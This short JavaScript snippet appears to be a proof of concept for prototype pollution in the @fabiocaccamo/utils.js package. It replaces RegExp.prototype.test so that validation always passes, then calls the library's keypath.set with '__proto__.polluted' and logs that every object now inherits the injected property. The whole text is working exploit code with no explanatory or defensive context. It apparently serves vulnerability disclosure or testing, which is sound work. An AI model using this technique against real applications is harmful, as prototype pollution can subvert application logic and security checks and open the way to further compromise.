RegExp.prototype.test = () => true;
const utils = require('@fabiocaccamo/utils.js');
const obj = {};
console.log({}.polluted);
utils.object.keypath.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);